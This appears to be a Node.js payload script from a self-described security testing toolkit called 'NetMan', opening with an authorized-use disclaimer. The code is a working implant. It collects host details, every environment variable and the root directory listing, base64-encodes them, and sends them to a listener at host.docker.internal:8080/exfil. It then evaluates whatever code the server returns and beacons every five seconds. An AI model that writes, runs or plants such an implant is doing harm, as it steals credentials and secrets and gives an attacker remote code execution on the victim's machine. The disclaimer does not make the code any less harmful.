//payload
/**
 * NetMan - payload.js
 * 
 * For authorized security testing only.
 * 
 * This script is part of the NetMan security testing toolkit and may include
 * capabilities for network interaction, exploitation, or post-exploitation
 * activity. Use only against systems you own or have explicit, documented
 * authorization to test (personal labs, CTFs, scoped bug bounty programs).
 * 
 * Unauthorized use against systems without consent is illegal under laws
 * such as the U.S. Computer Fraud and Abuse Act (CFAA) and equivalent
 * legislation elsewhere. The author is not responsible for misuse.
 * 
 * See DISCLAIMER.md in the project root for full terms.
 */
const os = require("os");
const http = require("http");
const fs = require("fs");

function getFingerprint() {
  let osType = os.type();
  let osRelease = os.release();
  let nodeName = os.hostname();
  return `OS: ${osType} ${osRelease}, Node: ${nodeName}, CWD: ${process.cwd()}`;
}

function stealEnvVars() {
  let secrets = "";
  for (let key in process.env) {
    secrets += `${key}=${process.env[key]}\n`;
  }
  return secrets;
}

function listRootDirs() {
  try {
    let dirs = fs.readdirSync("/");
    return "Root Dirs: " + dirs.join(", ");
  } catch (error) {
    return `Root Dirs Error: ${error.message}`;
  }
}

function exfiltrate(data, isReturnFire = false) {
  try {
    console.log("1. Data gathered. Size: " + data.length + " characters.");

    let b64Payload = Buffer.from(data).toString("base64");
    let targetUrl = `http://host.docker.internal:8080/exfil?c=${encodeURIComponent(b64Payload)}`;

    console.log("2. URL built. Total URL length: " + targetUrl.length);

    http
      .get(targetUrl, function (res) {
        let responseBody = "";
        res.on("data", function (chunk) {
          responseBody += chunk;
        });
        res.on("end", function () {
          if (isReturnFire) return;
          try {
            let command = JSON.parse(responseBody);
            let result = eval(command.code);
            console.log("5. Execution Result " + result);
            if (result != undefined) {
              exfiltrate("RESULT: " + result.toString(), true);
            }
          } catch (e) {
            console.log("5. Error Parsing Command: " + e.message);
          }
        });
      })
      .on("error", function (err) {
        console.log("4. Network Error: " + err.message);
      });
    console.log("3. Beacon fired over the network. Waiting for connection...");
  } catch (error) {
    console.log("5. Error Parsing Command: " + error.message);
  }
}

let fingerprint = getFingerprint();
let envVars = stealEnvVars();
let rootDirs = listRootDirs();

let fullData = `--- FINGERPRINT ---\n${fingerprint}\n\n--- ENV VARS ---\n${envVars}\n\n--- ROOT DIRS ---\n${rootDirs}`;

// Pull the trigger immediately the first time
exfiltrate(getFingerprint() + "\n" + stealEnvVars() + "\n" + listRootDirs());

// Then, set a heartbeat to check for new commands every 5 seconds
setInterval(function () {
  // We send a smaller "heartbeat" string to save bandwidth
  exfiltrate("--- BEACON ---");
}, 5000);
